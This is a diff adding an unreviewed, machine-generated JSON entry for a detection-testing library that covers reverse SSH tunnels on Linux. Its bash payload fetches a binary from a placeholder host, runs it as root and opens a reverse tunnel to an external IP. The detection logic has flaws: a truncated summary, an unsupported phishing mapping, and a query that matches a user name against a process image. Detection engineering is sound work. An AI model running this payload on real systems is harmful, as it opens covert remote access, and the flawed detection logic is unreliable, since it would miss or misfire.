@@ -1,0 +1,190 @@
+{
+  "id": "TTP-0000-0322",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-linux",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "linux"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Uncommon Reverse SSH Tunnel to External IP",
+    "summary": "An attacker establishes a reverse SSH tunnel to an external IP address using a non-standard port, likely to maintain persistence and exfiltrate data. Cortex should detect this behavior as an uncommon ",
+    "description": "An attacker establishes a reverse SSH tunnel to an external IP address using a non-standard port, likely to maintain persistence and exfiltrate data. Cortex should detect this behavior as an uncommon reverse SSH tunnel to an external domain or IP."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1021",
+        "subtechnique_id": "T1021.004",
+        "name": "Remote Services: SSH",
+        "tactic_ids": [
+          "TA0008"
+        ],
+        "tactic_names": [
+          "Lateral Movement"
+        ]
+      },
+      {
+        "technique_id": "T1059",
+        "subtechnique_id": "T1059.004",
+        "name": "Command and Scripting Interpreter: Unix Shell",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      },
+      {
+        "technique_id": "T1566",
+        "subtechnique_id": "T1566.001",
+        "name": "Phishing: Spearphishing Attachment",
+        "tactic_ids": [
+          "TA0001"
+        ],
+        "tactic_names": [
+          "Initial Access"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "linux",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "root",
+    "payload": {
+      "interpreter": "bash",
+      "code": "wget -O /tmp/ssh_client https://example.com/ssh_client\nchmod +x /tmp/ssh_client\n/tmp/ssh_client -R 8022:localhost:22 user@192.0.2.10\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "Execution of the SSH client binary with reverse tunnel parameters",
+        "expected_value": "action_process_image_name = '/tmp/ssh_client'"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Establishment of a reverse SSH tunnel to external IP",
+        "expected_value": "action_remote_ip = '192.0.2.10' and dst_port = 8022"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Reverse SSH Tunnel to External IP",
+        "description": "Detection of SSH process initiating reverse tunnel to external IP address",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name contains 'ssh'\n| filter action_command_line contains '-R'\n| filter action_remote_ip not in ('10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16', '127.0.0.0/8')",
+        "mitre_technique_ids": [
+          "T1021.004",
+          "T1059.004"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "Uncommon Reverse SSH Tunnel to External Domain/IP",
+        "description": "Behavioral deviation of SSH tunneling to external IP address not seen in normal behavior",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name contains 'ssh'\n| filter action_command_line contains '-R'\n| filter action_remote_ip not in ('10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16', '127.0.0.0/8')\n| filter causality_actor_process_image_name = 'bash'\n| filter actor_process_image_name = 'www-data'",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "ssh process start with reverse tunnel flag to external IP",
+        "mitre_technique_ids": [
+          "T1021.004",
+          "T1059.004",
+          "T1566.001"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Reverse SSH Tunnel Hunt",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name contains 'ssh'\n| filter action_command_line contains '-R'\n| filter action_remote_ip not in ('10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16', '127.0.0.0/8')\n| comp count() by action_remote_ip, action_command_line",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — Uncommon reverse SSH tunnel to external domain/ip; Required Data: XDR Agent. Ref: https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/uncommon-reverse-ssh-tunnel-to-external-domain-ip"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: Uncommon reverse SSH tunnel to external domain/ip",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/uncommon-reverse-ssh-tunnel-to-external-domain-ip",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1021.004",
+      "url": "https://attack.mitre.org/techniques/T1021/004/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1059.004",
+      "url": "https://attack.mitre.org/techniques/T1059/004/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1566.001",
+      "url": "https://attack.mitre.org/techniques/T1566/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
